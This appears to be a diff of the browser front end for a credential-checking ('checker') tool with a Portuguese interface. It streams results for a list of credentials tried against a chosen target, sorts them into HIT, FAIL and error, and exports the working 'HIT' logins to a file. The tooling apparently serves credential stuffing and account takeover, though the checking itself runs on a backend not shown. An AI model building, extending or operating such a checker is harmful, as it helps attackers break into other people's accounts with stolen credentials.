+        let ev;
+        try { ev = JSON.parse(line.slice(5).trim()); } catch { continue; }
+        if(ev.type === "result") {
+          done++;
+          const item = { cred: ev.credential ?? "?", detail: ev.detail ?? "" };
+          if(ev.status === "HIT")        results.hit.push(item);
+          else if(ev.status === "FAIL")  results.fail.push(item);
+          else                           results.error.push(item);
+          updateProgress(done, total);
+          updateResultCounts();
+          if(currentTab === "results") renderResultList();
+        } else if(ev.type === "done" || ev.type === "end") {
+          break;
         }
       }
     }
-  } catch { /**/ }
+  } catch(e) {
+    if(e?.name === "AbortError") return;
+    toast("⚠️ Stream encerrado");
+  }
+
+  running = false;
+  renderResultList();
+  updateResultCounts();
+  resetCheckerUI();
+  document.getElementById("live-label").textContent = `✅ Concluído — ${results.hit.length} HITs`;
+  toast(`✅ Finalizado! ${results.hit.length} HITs em ${total} credenciais`);
+  if(results.hit.length > 0) {
+    document.getElementById("btn-export").style.display = "flex";
+  }
+  switchTab("results");
 }
 
-loadStats();
-setInterval(loadStats, 3000);
+async function stopChecker() {
+  if(abortCtrl) { abortCtrl.abort(); abortCtrl = null; }
+  if(jobId) {
+    fetch(`${API}/api/checker/${jobId}`, { method: "DELETE" }).catch(() => {});
+    jobId = null;
+  }
+  running = false;
+  resetCheckerUI();
+  document.getElementById("live-label").textContent = "🛑 Parado pelo usuário";
+  toast("🛑 Checker parado");
+}
+
+function resetCheckerUI() {
+  running = false;
+  document.getElementById("action-btns").innerHTML =
+    `<button class="btn btn-primary" id="btn-start" onclick="startChecker()">⚔️ Iniciar Checker</button>`;
+  document.getElementById("progress-section").style.display = "none";
+}
+
+function updateProgress(d, t) {
+  const pct = t > 0 ? Math.round((d / t) * 100) : 0;
+  document.getElementById("prog-text").textContent = `${d.toLocaleString("pt-BR")} / ${t.toLocaleString("pt-BR")} verificados`;
+  document.getElementById("prog-pct").textContent  = `${pct}%`;
+  document.getElementById("prog-fill").style.width = `${pct}%`;
+}
+
+// ── Results ───────────────────────────────────────────────────────────────────
+function switchResultTab(tab) {
+  currentResultTab = tab;
+  ["hit","fail","error"].forEach(t => {
+    document.getElementById(`rtab-${t}`).classList.toggle("active", t === tab);
+  });
+  renderResultList();
+}
+
+function updateResultCounts() {
+  const h = results.hit.length, f = results.fail.length, e = results.error.length;
+  document.getElementById("r-hits").textContent   = h;
+  document.getElementById("r-fails").textContent  = f;
+  document.getElementById("r-errors").textContent = e;
+  document.getElementById("rtcount-hit").textContent   = h;
+  document.getElementById("rtcount-fail").textContent  = f;
+  document.getElementById("rtcount-error").textContent = e;
+}
+
+function renderResultList() {
+  const list  = document.getElementById("result-list");
+  const items = results[currentResultTab];
+  if(!items.length) {
+    const labels = { hit: "HIT", fail: "FAIL", error: "Erro" };
+    list.innerHTML = `<div class="result-empty">Nenhum ${labels[currentResultTab]} ainda.</div>`;
+    return;
+  }
+  list.innerHTML = items.slice(-100).map(item => {
+    const cred   = item.cred.split(" | ")[0] ?? item.cred;
+    const detail = item.detail || (item.cred.includes(" | ") ? item.cred.split(" | ").slice(1).join(" | ") : "");
+    return `<div class="result-item ri-${currentResultTab}">
+      <div class="ri-cred">${escHtml(cred)}</div>
+      ${detail ? `<div class="ri-detail">${escHtml(detail)}</div>` : ""}
+    </div>`;
+  }).join("");
+  list.scrollTop = list.scrollHeight;
+}
+
+function exportResults() {
+  const lines = results.hit.map(i => `${i.cred} | ${i.detail}`).join("\n");
+  if(!lines) { toast("Nenhum HIT para exportar"); return; }
+  const blob = new Blob([lines], { type: "text/plain" });
+  const url  = URL.createObjectURL(blob);
+  const a    = document.createElement("a");
+  a.href = url; a.download = `hits_${selectedTarget.id}.txt`;
+  a.click(); URL.revokeObjectURL(url);
+}
+
+// ── Helpers ───────────────────────────────────────────────────────────────────
+function escHtml(s) {
+  return String(s).replace(/[&<>"']/g, c =>
+    ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
+}
+
+let toastTimer;
+function toast(msg) {
+  const el = document.getElementById("toast");
+  el.textContent = msg;
+  el.classList.add("show");
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => el.classList.remove("show"), 2800);
+}
+
+// ── Init ──────────────────────────────────────────────────────────────────────
+buildTargets();
+updateStb();
 </script>
 </body>
 </html>
